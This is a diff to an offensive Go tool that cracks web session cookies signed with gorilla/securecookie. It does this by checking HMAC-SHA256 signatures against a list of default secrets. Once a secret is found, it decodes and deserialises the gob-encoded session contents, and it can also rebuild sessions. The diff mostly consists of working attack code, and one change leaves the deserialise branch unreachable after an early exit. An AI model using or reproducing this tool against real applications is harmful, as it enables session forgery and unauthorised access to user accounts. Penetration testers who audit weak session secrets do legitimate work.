@@ -9,6 +9,8 @@ import (
         "io/ioutil"
         "encoding/base64"
         "encoding/gob"
+        "crypto/hmac"
+        "crypto/sha256"
         "os"
         "net/http"
         "encoding/json"
@@ -63,49 +65,53 @@ func attack_session(file, secret, name, sess *string){
                         }
                 }
         }
-        var reader io.Reader;
-        var cookie http.Cookie;
-        cookie.Name  =*name
-        cookie.Value =*sess
-
-        for _, j:=range default_pws {
-                store := sessions.NewCookieStore([]byte(j))
-                r, _:=http.NewRequest("", "", reader)
-                r.AddCookie(&cookie) 
-                session, err := store.Get(r, cookie.Name)
-                if err != nil {
-                        continue
-                }
-                fmt.Printf("The secret is '%s'\n", j)
-                for i, j := range session.Values {
-                        fmt.Printf("\tKey %s -> Value %s\n", i, j)
-                }
-                os.Exit(0)
+        //Decode and split up first
+        sessdec, err := base64.URLEncoding.DecodeString(*sess)
+        if err != nil {
+                log.Printf("Could not decode session." + err.Error())
         }
-        log.Fatalf("Session Secret Not Found\n")
+        parts := bytes.SplitN(sessdec, []byte("|"), 3)
+        if len(parts) != 3 {
+                log.Fatalf("Not enough parts. Session might be encrypted")
+        }
+        for _, j:=range default_pws {
+                //Try to verify the mac with whatever arbitrary timestamp
+                //Would be easier to still use securecookie and instead fork it
+                //and remove the time check
+                hm := hmac.New(sha256.New, []byte(j))
+                b := append([]byte(*name+"|"), []byte(sessdec[:len(sessdec)-len(parts[2])-1])...)
+                hm.Write([]byte(b))
+                sum := hm.Sum(nil)
+                if bytes.Compare(sum, parts[2]) == 0 {
+                        log.Printf("Session Secret Found! It is %s\n", j)
+                        desersess(sess);
+                        os.Exit(0)
+                }
+        }
+        log.Printf("Session Secret Not Found but we are going to try to deserialize it, in the case it is integrity only.\n")
+        desersess(sess);
 }
 func desersess(sess *string){
         if len(*sess) == 0{
                 log.Fatalf("No Session to Deserialize")
         }
-        sessdata, err := base64.StdEncoding.DecodeString(*sess)
+        sessdata, err := base64.URLEncoding.DecodeString(*sess)
         if err != nil {
-                log.Fatalf("Could not decode session.")
+                log.Printf("Could not decode session." + err.Error())
         }
         parts := bytes.SplitN(sessdata, []byte("|"), 3)
         if len(parts) != 3 {
-                log.Fatalf("Invalid Session Data.")
+                log.Printf("Invalid Session Data.")
         }
         var contents map[interface{}]interface{}
         dstdecoded := make([]byte, base64.URLEncoding.EncodedLen(len(parts[1])))
         n, err := base64.URLEncoding.Decode(dstdecoded, parts[1])
         if err != nil {
-                log.Fatalf("Could not decode session contents.")
+                log.Printf("Could not decode session contents.")
         }
         dec := gob.NewDecoder(bytes.NewBuffer(dstdecoded[:n]))
         if err := dec.Decode(&contents); err != nil {
-                log.Fatalf(err.Error())
-                log.Fatalf("Could not deserialize session contents.")
+                log.Printf("Could not deserialize session contents.")
         }
         fmt.Printf("The contents of the session are.\n")
         for i, j := range contents {
@@ -120,14 +126,14 @@ func main(){
         deser := flag.Bool("d", false, "Deserialize if integrity only.")
         rebuild := flag.Bool("r", false, "True if you are reconstructing the session.")
         flag.Parse()
-       
+
         if *deser {
-                desersess(sess)
                 os.Exit(0)
-        } 
+                desersess(sess)
+        }
         if len(*name) == 0 {
                 log.Fatalf("Name must be set to attack or reconstruct a session.\n")
-        }  
+        }
 
         if *rebuild {
                 if len(*file) == 0 {
@@ -140,7 +146,7 @@ func main(){
         } else {
                 if len(*sess) == 0 {
                         log.Fatalf("Session value required to attack the session.\n")
-                }  
+                }
                 attack_session(file, secret, name, sess)
         }
 }
